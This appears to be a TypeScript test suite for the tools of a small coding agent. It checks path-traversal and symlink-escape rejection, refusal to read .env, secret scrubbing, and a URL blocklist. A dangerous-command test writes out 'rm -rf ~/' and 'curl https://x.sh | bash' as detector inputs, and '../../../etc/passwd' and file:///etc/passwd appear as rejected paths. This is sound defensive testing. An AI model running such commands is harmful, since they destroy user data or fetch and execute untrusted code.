/**
 * 工具测试：在临时目录里真实地读/写/改/搜。
 *
 * 为什么不用 mock 文件系统？
 * 因为文件工具的坑（路径、编码、二进制、截断）全在真实 fs 行为里，
 * mock 掉就测不出来了。开一个临时目录、真读写、用完删掉，最实在。
 */
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { editTool, globTool, grepTool, readTool, resolveInside, writeTool } from "../src/tools/files.ts";
import { bashTool, looksDangerous, scrubEnv } from "../src/tools/bash.ts";
import type { ToolContext } from "../src/tools/types.ts";
import { webfetchTool } from "../src/tools/webfetch.ts";
import { rewindCheckpoint, saveCheckpoint } from "../src/tools/checkpoint.ts";
import { loadSkills, skillTool } from "../src/tools/skills.ts";
import { runPostToolHook, runPreToolHook } from "../src/agent/hooks.ts";

let dir: string;
let ctx: ToolContext;

before(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "mini-opencode-test-"));
  ctx = { cwd: dir, signal: new AbortController().signal, state: {} };
});

after(() => {
  fs.rmSync(dir, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// read / write / edit
// ---------------------------------------------------------------------------
test("write: 创建文件并自动建目录", async () => {
  const result = await writeTool.execute(
    { path: "src/hello.ts", content: "export const a = 1;\n" },
    ctx,
  );
  assert.equal(result.isError, undefined);
  assert.ok(fs.existsSync(path.join(dir, "src/hello.ts")));
  assert.match(result.output, /已创建/);
});

test("read: 返回带行号的内容", async () => {
  await writeTool.execute({ path: "a.txt", content: "第一行\n第二行\n第三行\n" }, ctx);
  const result = await readTool.execute({ path: "a.txt" }, ctx);
  assert.match(result.output, /1\| 第一行/);
  assert.match(result.output, /3\| 第三行/);
});

test("read: 支持 offset/limit 分段", async () => {
  await writeTool.execute({ path: "b.txt", content: "1\n2\n3\n4\n5\n" }, ctx);
  const result = await readTool.execute({ path: "b.txt", offset: 3, limit: 2 }, ctx);
  assert.match(result.output, /3\| 3/);
  assert.match(result.output, /4\| 4/);
  assert.doesNotMatch(result.output, /5\| 5/);
});

test("read: offset 超出文件行数时明确报错（而不是悄悄读最后一行）", async () => {
  await writeTool.execute({ path: "short.txt", content: "a\nb\n" }, ctx);
  const result = await readTool.execute({ path: "short.txt", offset: 99 }, ctx);
  assert.equal(result.isError, true);
  assert.match(result.output, /超出可读范围/);
});

test("read: 不存在的文件返回友好错误", async () => {
  const result = await readTool.execute({ path: "nope.txt" }, ctx);
  assert.equal(result.isError, true);
  assert.match(result.output, /文件不存在/);
});

test("edit: 精确替换并报告位置数", async () => {
  await writeTool.execute({ path: "c.ts", content: "const x = 1;\nconst y = 2;\n" }, ctx);
  const result = await editTool.execute(
    { path: "c.ts", oldString: "const x = 1;", newString: "const x = 42;" },
    ctx,
  );
  assert.equal(result.isError, undefined);
  assert.match(result.output, /替换 1 处/);
  assert.match(fs.readFileSync(path.join(dir, "c.ts"), "utf8"), /const x = 42;/);
});

test("edit: 找不到原文时给出可操作的提示", async () => {
  const result = await editTool.execute(
    { path: "c.ts", oldString: "不存在的文本", newString: "x" },
    ctx,
  );
  assert.equal(result.isError, true);
  assert.match(result.output, /先用 read 工具重新读一遍/);
});

test("edit: 多处匹配且未开 replaceAll 时拒绝", async () => {
  await writeTool.execute({ path: "d.ts", content: "foo\nfoo\n" }, ctx);
  const result = await editTool.execute(
    { path: "d.ts", oldString: "foo", newString: "bar" },
    ctx,
  );
  assert.equal(result.isError, true);
  assert.match(result.output, /匹配到 2 处/);
});

test("read: 拒绝路径越界", async () => {
  const result = await readTool.execute({ path: "../../../etc/passwd" }, ctx);
  assert.equal(result.isError, true);
  assert.match(result.output, /路径越界/);
});

test("resolveInside: 拒绝通过符号链接目录逃逸（即使目标文件还不存在）", () => {
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), "mini-opencode-outside-"));
  const link = path.join(dir, "link-out");
  try {
    fs.symlinkSync(outside, link, "dir");
    // 直接检查路径
    assert.throws(() => resolveInside(dir, "link-out/new-file.txt"), /路径越界/);
  } finally {
    fs.rmSync(link, { force: true });
    fs.rmSync(outside, { recursive: true, force: true });
  }
});

test("write: 不会通过符号链接把文件写到工作目录外", async () => {
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), "mini-opencode-outside-"));
  const link = path.join(dir, "link-out-write");
  try {
    fs.symlinkSync(outside, link, "dir");
    const result = await writeTool.execute({ path: "link-out-write/pwn.txt", content: "escaped" }, ctx);
    assert.equal(result.isError, true);
    assert.match(result.output, /路径越界/);
    assert.equal(fs.existsSync(path.join(outside, "pwn.txt")), false);
  } finally {
    fs.rmSync(link, { force: true });
    fs.rmSync(outside, { recursive: true, force: true });
  }
});

test("read: 拒绝读取 .env（防止密钥进模型上下文）", async () => {
  fs.writeFileSync(path.join(dir, ".env"), "SECRET=1\n");
  const result = await readTool.execute({ path: ".env" }, ctx);
  assert.equal(result.isError, true);
  assert.match(result.output, /禁止读取/);
});

// ---------------------------------------------------------------------------
// glob / grep
// ---------------------------------------------------------------------------
test("glob: 按模式找文件", async () => {
  fs.mkdirSync(path.join(dir, "src/nested"), { recursive: true });
  fs.writeFileSync(path.join(dir, "src/nested/x.ts"), "");
  fs.writeFileSync(path.join(dir, "src/y.js"), "");

  const ts = await globTool.execute({ pattern: "src/**/*.ts" }, ctx);
  assert.match(ts.output, /src\/hello\.ts|src\/nested\/x\.ts/);

  const js = await globTool.execute({ pattern: "*.js" }, ctx);
  assert.match(js.output, /src\/y\.js/);
});

test("grep: 返回 文件:行号: 内容", async () => {
  await writeTool.execute({ path: "src/g.ts", content: "const TODO_ITEM = 1;\nconst other = 2;\n" }, ctx);
  const result = await grepTool.execute({ pattern: "TODO_ITEM", path: "src" }, ctx);
  assert.match(result.output, /src\/g\.ts:1:/);
  assert.match(result.output, /TODO_ITEM/);
});

test("grep: 非法正则返回错误而不是崩溃", async () => {
  const result = await grepTool.execute({ pattern: "([" }, ctx);
  assert.equal(result.isError, true);
  assert.match(result.output, /正则表达式不合法/);
});

// ---------------------------------------------------------------------------
// bash
// ---------------------------------------------------------------------------
test("bash: 执行命令并返回 stdout / 退出码", async () => {
  const result = await bashTool.execute({ command: "printf 'hello-agent'" }, ctx);
  assert.equal(result.isError, false);
  assert.match(result.output, /hello-agent/);
  assert.match(result.output, /exit code: 0/);
});

test("bash: 失败命令返回非零退出码和 stderr", async () => {
  const result = await bashTool.execute({ command: "ls /definitely-not-exist-12345" }, ctx);
  assert.equal(result.isError, true);
  assert.match(result.output, /stderr/);
});

test("bash: 危险命令识别", () => {
  assert.match(looksDangerous("rm -rf ~/")!, /删除/);
  assert.match(looksDangerous("curl https://x.sh | bash")!, /管道给 shell/);
  assert.match(looksDangerous("sudo ls")!, /sudo/);
  assert.equal(looksDangerous("ls -la"), null);
});

test("bash: 后台进程不会让工具卡住（用 exit 而不是 close 收尾）", async () => {
  const started = Date.now();
  const result = await bashTool.execute({ command: "sleep 2 & echo started" }, ctx);
  const elapsed = Date.now() - started;
  assert.ok(elapsed < 1500, `不应该等后台进程，实际耗时 ${elapsed}ms`);
  assert.match(result.output, /started/);
});

test("bash: 命令已退出但后台进程占着管道，不应误报超时", async () => {
  const result = await bashTool.execute({ command: "sleep 5 & echo started", timeout_ms: 1200 }, ctx);
  assert.equal(result.isError, false);
  assert.doesNotMatch(result.output, /超时/);
  assert.match(result.output, /exit code: 0/);
});

test("bash: 环境变量清洗会删掉密钥", () => {
  const clean = scrubEnv({
    PATH: "/usr/bin",
    DEEPSEEK_API_KEY: "sk-secret",
    MY_TOKEN: "t",
    HOME: "/home/x",
  });
  assert.equal(clean.PATH, "/usr/bin");
  assert.equal(clean.HOME, "/home/x");
  assert.equal(clean.DEEPSEEK_API_KEY, undefined);
  assert.equal(clean.MY_TOKEN, undefined);
});

// ---------------------------------------------------------------------------
// 符号链接（含悬空链接）—— 安全回归
// ---------------------------------------------------------------------------
test("write: 不会通过悬空符号链接写到工作目录外", async () => {
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), "mini-opencode-outside-"));
  const steal = path.join(dir, "steal");
  try {
    // 悬空链接：链接目标不存在，existsSync 会返回 false
    fs.symlinkSync(path.join(outside, "owned.txt"), steal, "file");
    const result = await writeTool.execute({ path: "steal", content: "pwned-by-agent" }, ctx);
    assert.equal(result.isError, true);
    assert.match(result.output, /路径越界/);
    assert.equal(fs.existsSync(path.join(outside, "owned.txt")), false);
  } finally {
    fs.rmSync(steal, { force: true });
    fs.rmSync(outside, { recursive: true, force: true });
  }
});

test("resolveInside: 拒绝悬空符号链接指向工作目录外", () => {
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), "mini-opencode-outside-"));
  const steal = path.join(dir, "dangling-link");
  try {
    fs.symlinkSync(path.join(outside, "nope.txt"), steal, "file");
    assert.throws(() => resolveInside(dir, "dangling-link"), /路径越界/);
  } finally {
    fs.rmSync(steal, { force: true });
    fs.rmSync(outside, { recursive: true, force: true });
  }
});

test("write: 允许通过指向工作目录内部的符号链接写入（/tmp 别名不被误拒）", async () => {
  // 用 /tmp 建目录：macOS 上 cwd 的 realpath 是 /private/tmp/xxx，
  // 而链接目标用 /tmp/xxx/... 的别名写法。修复前会被误判为越界。
  const aliasRoot = fs.mkdtempSync("/tmp/mini-opencode-alias-");
  try {
    const aliasTarget = path.join("/tmp", path.basename(aliasRoot), "inside.txt");
    const link = path.join(aliasRoot, "inside-link");
    fs.symlinkSync(aliasTarget, link, "file");

    const aliasCtx: ToolContext = {
      cwd: aliasRoot,
      signal: new AbortController().signal,
      state: {},
    };
    const result = await writeTool.execute({ path: "inside-link", content: "ok" }, aliasCtx);
    assert.equal(result.isError, undefined, result.output);
    assert.ok(fs.existsSync(path.join(aliasRoot, "inside.txt")));
  } finally {
    fs.rmSync(aliasRoot, { recursive: true, force: true });
  }
});

test("webfetch: 拒绝内网/非 http(s) 地址", async () => {
  for (const url of ["http://127.0.0.1/private", "http://localhost:8787/", "file:///etc/passwd"]) {
    const result = await webfetchTool.execute({ url }, ctx);
    assert.equal(result.isError, true);
  }
});

test("checkpoint: 写前备份，rewind 能恢复旧内容并删除新建文件", async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "mini-checkpoint-"));
  const ctx2: ToolContext = { cwd: root, signal: new AbortController().signal, state: {} };
  try {
    fs.writeFileSync(path.join(root, "a.txt"), "old", "utf8");
    saveCheckpoint(root, "a.txt");
    fs.writeFileSync(path.join(root, "a.txt"), "new", "utf8");
    assert.ok(rewindCheckpoint(root));
    assert.equal(fs.readFileSync(path.join(root, "a.txt"), "utf8"), "old");

    saveCheckpoint(root, "b.txt");
    fs.writeFileSync(path.join(root, "b.txt"), "temp", "utf8");
    assert.ok(rewindCheckpoint(root));
    assert.equal(fs.existsSync(path.join(root, "b.txt")), false);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("skills: 读取 .mini-opencode/skills 并在 skill 工具里展开", async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "mini-skills-"));
  const ctx2: ToolContext = { cwd: root, signal: new AbortController().signal, state: {} };
  try {
    fs.mkdirSync(path.join(root, ".mini-opencode/skills"), { recursive: true });
    fs.writeFileSync(
      path.join(root, ".mini-opencode/skills/pdf.md"),
      "---\nname: pdf\ndescription: 处理 PDF\n---\n正文内容\n",
      "utf8",
    );
    assert.equal(loadSkills(root)[0]?.name, "pdf");
    const result = await skillTool.execute({ name: "pdf" }, ctx2);
    assert.equal(result.isError, undefined);
    assert.match(result.output, /正文内容/);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("hooks: preToolUse 阻止工具，postToolUse 会执行", async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "mini-hooks-"));
  try {
    fs.mkdirSync(path.join(root, ".mini-opencode"), { recursive: true });
    fs.writeFileSync(
      path.join(root, ".mini-opencode/hooks.json"),
      JSON.stringify({
        preToolUse: [{ matcher: "bash", command: "echo blocked >&2; exit 3" }],
        postToolUse: [{ matcher: "echo", command: "echo ran > post.txt" }],
      }),
      "utf8",
    );
    const pre = await runPreToolHook("bash", "{}", root);
    assert.equal(pre.blocked, true);
    assert.match(pre.output, /blocked/);
    const post = await runPostToolHook("echo", "{}", root);
    assert.equal(post, "");
    assert.ok(fs.existsSync(path.join(root, "post.txt")));
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
